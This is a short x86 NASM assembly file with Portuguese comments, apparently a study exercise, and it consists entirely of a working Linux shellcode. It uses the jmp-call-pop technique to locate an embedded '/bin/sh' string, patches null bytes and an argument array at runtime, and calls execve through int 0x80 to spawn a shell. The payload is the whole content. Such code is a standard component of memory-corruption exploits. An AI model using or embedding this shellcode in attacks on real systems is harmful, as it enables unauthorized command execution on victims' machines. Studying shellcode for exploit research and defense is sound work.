[SECTION .text]
	global _start

_start:
	jmp short ender

	starter:
	    pop ebx ; carrega o endereço da string
		xor eax, eax
	    mov [ebx+7], al ; carrega null no lugar do n
	    mov [ebx+8], ebx ; carrega o endereço da string no lugar do \A\A\A
	    mov [ebx+12], eax ; como o eax foi limpado carrega null pro lugar dos bs só sobrando o sh
	    mov al, 11 ; syscall do execve
	    lea ecx, [ebx+8] ; carrega o endereço dos as no ecx
	    lea edx, [ebx+12] ; carrega o endereço de nulls execve(shell, arg1, ebx+12)
	    int 0x80
	ender:
	    call starter
	    db '/bin/shNAAAABBBB' ; caracteres a mais devido ao array de ponteiros
